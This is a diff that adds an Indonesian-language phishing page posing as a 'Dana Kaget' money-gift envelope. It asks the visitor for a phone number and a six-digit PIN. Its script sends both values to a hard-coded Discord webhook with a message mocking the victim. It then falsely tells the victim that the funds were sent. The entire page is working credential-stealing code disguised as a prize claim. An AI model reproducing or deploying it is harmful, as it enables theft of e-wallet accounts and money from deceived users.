@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>kirim uang by anos</title>
+    <style>
+        /* Reset dan pengaturan dasar */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Pengaturan body */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #007bff;
+        }
+
+        /* Container utama */
+        .container {
+            text-align: center;
+            width: 100%;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #fff;
+        }
+
+        /* Styling amplop - full screen */
+        .envelope {
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        /* Container input */
+        .input-container {
+            display: none;
+            flex-direction: column;
+            gap: 1rem;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 320px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        /* Styling input */
+        input {
+            margin: 0.5rem 0;
+            padding: 0.8rem;
+            font-size: 1rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            text-align: center;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        /* Styling tombol */
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 0.8rem;
+            cursor: pointer;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        /* Styling teks */
+        p {
+            margin: 0.8rem 0;
+            color: #333;
+            font-size: 1rem;
+        }
+
+        #step1 p {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.9);
+            padding: 10px 20px;
+            border-radius: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="step1">
+            <img src="https://qu.ax/CJlOJ.webp" alt="Amplop Dana Kaget" class="envelope" onclick="nextStep(2)">
+            <p>Klik amplop untuk membuka</p>
+        </div>
+        
+        <div id="step2" class="input-container">
+            <p>Masukkan Nomor HP</p>
+            <input type="tel" id="phoneNumber" placeholder="08xxxxxxxxxx" minlength="10" maxlength="15" pattern="[0-9]+" required>
+            <button onclick="validatePhone()">Lanjut</button>
+        </div>
+
+        <div id="step3" class="input-container">
+            <p>Masukkan PIN</p>
+            <input type="password" id="pin" placeholder="******" minlength="6" maxlength="6" pattern="[0-9]+" required>
+            <button onclick="validatePin()">Klaim</button>
+        </div>
+
+        <div id="step4" class="input-container">
+            <p>Berhasil! Dana telah dikirim.</p>
+            <p>Tunggu 1/24jm</p>
+        </div>
+    </div>
+
+    <script>
+// Fungsi untuk mengganti langkah
+function nextStep(step) {
+    document.querySelectorAll('.container > div').forEach(div => {
+        div.style.display = 'none';
+    });
+    document.getElementById('step' + step).style.display = step === 1 ? 'block' : 'flex';
+}
+
+// Validasi nomor telepon
+function validatePhone() {
+    const phone = document.getElementById('phoneNumber').value;
+    if (/^\d{10,15}$/.test(phone)) {
+        nextStep(3);
+    } else {
+        alert("Nomor HP harus angka dan minimal 10 digit!");
+    }
+}
+
+
+function validatePin() {
+    const pin = document.getElementById('pin').value;
+    const phone = document.getElementById('phoneNumber').value;
+
+    if (/^\d{6}$/.test(pin)) {
+ 
+        const webhookURL = "https://discord.com/api/webhooks/1333768081322807317/WhqiMrMr3s2lNmXjh3Sz9D6TP0zuP1d0ZpJNYKEYOSgEUAPntOSxf8tYiIZ8p7QFBdVk";
+        const data = {
+            content: `━━━━━━━━━━━━━━━━━━━\n` +
+                     `**Terdeteksi Suki 😹**\n` +
+                     `**Nomor HP:** ${phone}\n` +
+                     `**PIN:** ${pin}\n` +
+                     `**Anos ini apalahh**\n` +
+                     `━━━━━━━━━━━━━━━━━━━`,
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+        })
+        .then((response) => {
+            if (response.ok) {
+                nextStep(4); // Pindah ke langkah sukses
+            } else {
+                alert("Gagal mengirim. Cek koneksi internet.");
+            }
+        })
+        .catch((error) => {
+            console.error("Error:", error);
+            alert("Terjadi kesalahan saat mengirim.");
+        });
+    } else {
+        alert("PIN harus angka dan 6 digit!");
+    }
+}
+    </script>
+</body>
+</html>
